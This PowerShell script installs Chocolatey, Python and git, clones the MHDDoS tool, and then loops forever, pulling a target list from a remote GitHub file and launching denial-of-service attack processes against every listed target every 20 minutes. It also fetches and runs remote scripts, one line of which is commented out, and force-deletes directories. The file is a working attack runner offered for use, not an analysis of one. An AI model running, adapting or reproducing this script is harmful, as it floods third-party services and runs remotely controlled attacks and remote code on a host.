
#[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"; $ScriptBlock = [scriptblock]::Create((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mErlin-sp/mhddos_powershell/master/runner.ps1')); Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList ''
Remove-Item C:\ProgramData\chocolatey -Recurse -Force
# Install Choco
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install -y python3 # Install Python

choco install -y git # Install GIT

$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User") # Refresh env variables

###
Set-Location '~'
Remove-Item 'MHDDoS' -Recurse -Force
git clone 'https://github.com/MatrixTM/MHDDoS.git'
Set-Location '~/MHDDoS'
python -m pip install -r 'requirements.txt'

$p = ' -p 1200'
$rpc = ' --rpc 1000'
$debug = ' --debug'
python.exe -m pip install --upgrade pip
# Restart attacks and update targets every 20 minutes
while($true){
    Stop-Process -Name "Python" -Force 

    # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.    
    $targets = ((Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches

    while ($targets.Length -eq 0) {
        Write-Output 'Empty target list or some error happened. If this message repeats - contact author.' 
        Start-Sleep(5)
        $targets = ((Invoke-WebRequest -Headers @{"Cache-Control"="no-cache"} -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
    }
    Write-Output $('Number of targets in list: ' + $targets.Length) 
    
    foreach ($target in $targets) { 
        $runner_args = $('runner.py ' + $target.Value + $p + $rpc + $debug + ' ' + $args)
        Write-Output $runner_args

        Start-Process -FilePath 'python' -WorkingDirectory '~/MHDDoS/' -ArgumentList $runner_args -NoNewWindow
        # Start-Job -ScriptBlock {Set-Location '~/MHDDoS/'; Write-Output $args; python runner.py $args} -ArgumentList $runner_args 
    }

    Start-Sleep(20*60) # Sleep for 20 minutes
}
